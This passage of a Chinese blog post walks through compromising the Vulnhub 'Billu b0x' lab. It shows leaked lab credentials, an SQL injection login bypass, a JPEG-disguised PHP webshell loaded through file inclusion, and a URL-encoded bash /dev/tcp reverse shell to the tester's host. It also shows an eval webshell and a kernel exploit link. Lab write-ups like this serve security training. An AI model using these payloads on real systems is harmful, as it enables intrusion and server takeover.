class="string">"&lt;br&gt;i told you dear, only png,jpg and gif file are allowed"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;only png,jpg and gif file are allowed"</span>;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先是校验上传的文件的后缀名，只能是这四种<code>&#39;jpeg&#39;,&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;</code>之一。然后再通过<code>@$finfo-&gt;file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;]);</code>获取上传的文件的<code>Content-Type</code>，对其进行校验，这里仅支持三种类型：<code>image/jpeg</code>，<code>image/png</code>和<code>image/gif</code>。并且可以知道上传的文件被保存在目录<code>uploaded_images</code>下。</p>
+<p>发现<code>c.php</code>是负责进行数据库连接的，这里泄露了数据库的账户信息：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#header( 'Z-Powered-By:its chutiyapa xD' );</span></span><br><span class="line">header(<span class="string">'X-Frame-Options: SAMEORIGIN'</span>);</span><br><span class="line">header( <span class="string">'Server:testing only'</span> );</span><br><span class="line">header( <span class="string">'X-Powered-By:testing only'</span> );</span><br><span class="line"></span><br><span class="line">ini_set( <span class="string">'session.cookie_httponly'</span>, <span class="number">1</span> );</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"billu"</span>,<span class="string">"b0x_billu"</span>,<span class="string">"ica_lab"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"connection failed -&gt;  "</span> . mysqli_connect_error();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>mysqli_connect</code>函数是<code>mysqli::__construct()</code>函数的别名：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/15.png" alt="15"></p>
+<p>第2个参数和第3个参数分别是登录数据库的账号和密码，所以得到了登录数据库的账号密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: billu</span><br><span class="line">password: b0x_billu</span><br></pre></td></tr></table></figure>
+
+<p>看看能不能登录phpmyadmin，访问<code>http://192.168.247.211/phpmy</code> ：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/16.png" alt="16"></p>
+<p>成功登录了。这样我们就得到了明文存储的账号密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: biLLu	</span><br><span class="line">password: hEx_it</span><br></pre></td></tr></table></figure>
+
+<p>在<code>index.php</code>页面的源码中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'c.php'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'head.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(@$_SESSION[<span class="string">'logged'</span>]!=<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$_SESSION[<span class="string">'logged'</span>]=<span class="string">''</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'logged'</span>]==<span class="keyword">true</span> &amp;&amp;  $_SESSION[<span class="string">'admin'</span>]!=<span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"you are logged in :)"</span>;</span><br><span class="line">	header(<span class="string">'Location: panel.php'</span>, <span class="keyword">true</span>, <span class="number">302</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div align=center style="margin:30px 0px 0px 0px;"&gt;</span></span><br><span class="line"><span class="string">&lt;font size=8 face="comic sans ms"&gt;--==[[ billu b0x ]]==--&lt;/font&gt; </span></span><br><span class="line"><span class="string">&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">Show me your SQLI skills &lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;form method=post&gt;</span></span><br><span class="line"><span class="string">Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=login value="let\'s login"&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$uname=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'un'</span>]));</span><br><span class="line">	$pass=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'ps'</span>]));</span><br><span class="line">	$run=<span class="string">'select * from auth where  pass=\''</span>.$pass.<span class="string">'\' and uname=\''</span>.$uname.<span class="string">'\''</span>;</span><br><span class="line">	$result = mysqli_query($conn, $run);</span><br><span class="line">	<span class="keyword">if</span> (mysqli_num_rows($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">	$row = mysqli_fetch_assoc($result);</span><br><span class="line">		   <span class="keyword">echo</span> <span class="string">"You are allowed&lt;br&gt;"</span>;</span><br><span class="line">		   $_SESSION[<span class="string">'logged'</span>]=<span class="keyword">true</span>;</span><br><span class="line">		   $_SESSION[<span class="string">'admin'</span>]=$row[<span class="string">'username'</span>];</span><br><span class="line">		   </span><br><span class="line">		 header(<span class="string">'Location: panel.php'</span>, <span class="keyword">true</span>, <span class="number">302</span>);</span><br><span class="line">	   </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Try again');&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\"&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; "</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中与sql相关的关键代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uname=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'un'</span>]));</span><br><span class="line">$pass=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'ps'</span>]));</span><br><span class="line">$run=<span class="string">'select * from auth where  pass=\''</span>.$pass.<span class="string">'\' and uname=\''</span>.$uname.<span class="string">'\''</span>;</span><br><span class="line">$result = mysqli_query($conn, $run);</span><br></pre></td></tr></table></figure>
+
+<p>程序会调用<code>str_replace</code>将username和password中的<code>&#39;</code>字符都替换为<code>&#39;&#39;</code>，在本地测试了下，传入的<code>admin&#39; or &#39;1&#39;=&#39;1</code>中的<code>&#39;</code>全部都被替换为空字符串了：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/25.png" alt="25"></p>
+<p>因为<code>pass</code>在查询的and语句的前半部分，所以可以通过先注释掉pass的<code>&#39;</code>来闭合：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/26.png" alt="26"></p>
+<p>所以如果要进行sql注入，那payload就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">un: or 1&#x3D;1 --</span><br><span class="line">ps: \</span><br></pre></td></tr></table></figure>
+
+<p>经过测试，这样是可以成功登录的。</p>
+<p>任意文件读取漏洞那里还可以读取<code>phpmyadmin</code>的配置文件，默认为<code>/var/www/phpmy/config.inc.php</code> :</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/18.png" alt="18"></p>
+<blockquote>
+<p><code>$cfg[&#39;Servers&#39;][$i][&#39;user&#39;]</code> ：MySQL连接用户<br><code>$cfg[&#39;Servers&#39;][$i][&#39;password&#39;]</code> ：登录密码</p>
+</blockquote>
+<p>得到了用户登录mysql的账户密码<code>root : roottoor</code>。</p>
+<p>尝试用这个登录ssh，登录成功！</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/19.png" alt="19"></p>
+<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><h5 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h5><p>先利用之前获得的账号密码<code>biLLu : hEx_it</code>登录网站<code>http://192.168.247.211</code>：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/17.png" alt="17"></p>
+<p>在上面的选项框中有两个选择：<code>Show Users</code>和<code>Add User</code>。前面也说过，在<code>panel.php</code>文件中存在一个文件包含漏洞：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/20.png" alt="20"></p>
+<p>这里<code>$_POST[&#39;load&#39;]</code>是完全可控的，可以包含任意的文件，比如令<code>load=../../../etc/passwd</code>：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/21.png" alt="21"></p>
+<p>然后<code>panel.php</code>中又包含图片上传功能，所以我们的目标就是上传一个图片马，然后用任意文件包含给它包含进来。</p>
+<p>先在本地随便新建一个图片，因为前面会判断图片的类型，所以这里就直接用jpg的文件头<code>FFD8FFE</code>创建了一个图片，然后在末尾追加一句话木马：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Pictures$ rm evil.jpg </span><br><span class="line">kali@kali:~/Pictures$ echo 'FFD8FFEo' | xxd -r -p &gt; evil.jpg</span><br><span class="line">kali@kali:~/Pictures$ echo '&lt;?php system($_GET['cmd']);?&gt;' &gt;&gt; evil.jpg</span><br><span class="line">kali@kali:~/Pictures$ cat evil.jpg </span><br><span class="line">���&lt;?php system($_GET[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>创建jpg图片使用的命令为<code>xxd -r -p</code>，可以把纯十六进制转储为二进制文件。</p>
+<p>上传后的图片马被保存在<code>/uploaded_images</code>文件夹下：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/22.png" alt="22"></p>
+<p>所以加下来利用<code>panel.php</code>中的文件包含漏洞将该文件包含进来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url: </span><br><span class="line">&#x2F;panel.php?cmd&#x3D;ls</span><br><span class="line"></span><br><span class="line">POST: </span><br><span class="line">load&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;uploaded_images&#x2F;evil.jpg&amp;continue&#x3D;continue</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/23.png" alt="23"></p>
+<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>然后通过反弹shell进一步控制目标主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.247.210&#x2F;23333 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure>
+
+<p>url编码一下再请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;panel.php?cmd&#x3D;%65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%34%37%2e%32%31%30%2f%32%33%33%33%33%20%30%3e%26%31%22%20%7c%20%62%61%73%68 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.247.211</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.247.211&#x2F;panel.php</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;b7uv2mvjig2lrs6v4n8s71qad5</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">load&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;uploaded_images&#x2F;evil.jpg&amp;continue&#x3D;continue</span><br></pre></td></tr></table></figure>
+
+<p>获得了靶机的bash：<br><img src="/2020/06/12/vulnhub_Billu/imgs/24.png" alt="24"></p>
+<p>接着找一个具有写权限的目录，写入木马：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/var/www$ cd uploaded_images</span><br><span class="line">cd uploaded_images</span><br><span class="line">www-data@indishell:/var/www/uploaded_images$ echo '&lt;?php eval($_POST[1]);?&gt;' &gt;&gt; shell.php</span><br><span class="line">&lt;/uploaded_images$ echo '&lt;?php eval($_POST[1]);?&gt;' &gt;&gt; shell.php              </span><br><span class="line">www-data@indishell:/var/www/uploaded_images$ ls</span><br><span class="line">ls</span><br><span class="line">3.jpg</span><br><span class="line">CaptBarbossa.JPG</span><br><span class="line">c.JPG</span><br><span class="line">evil.jpg</span><br><span class="line">jack.jpg</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure>
+
+<p>写入木马之后，可以连接蚁剑。</p>
+<h5 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h5><p>查看当前的内核版本及系统版本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/var/www/uploaded_images$ uname -r</span><br><span class="line">uname -r</span><br><span class="line">3.13.0-32-generic</span><br><span class="line">www-data@indishell:/var/www/uploaded_images$ cat /etc/issue</span><br><span class="line">cat /etc/issue</span><br><span class="line">Ubuntu 12.04.5 LTS \n \l</span><br></pre></td></tr></table></figure>
+
+<p>然后网上搜索一下本地提权的exp：<a href="https://www.exploit-db.com/exploits/37292/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/37292/</a> 。</p>
+<p>对其进行编译，执行就可以实现本地提权。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次的靶机里面涉及到的代码审计这一块还是相对比较简单的，然后在爆破目录这里，从这个靶机来看，用<code>Disbuster</code>没有爆出<code>phpmy</code>目录还是有点坑，而且花费的时间也不少，一方面可能是字典比较小，另一方面可能爆目录的时候最好还是使用<code>dirb</code>。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/06/12/vulnhub_Billu/">https://bantttian.github.io/2020/06/12/vulnhub_Billu/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/06/07/%5BCISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4%5D-Laravel1/">CISCN2019 总决赛 Day1 Web4_Laravel1</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
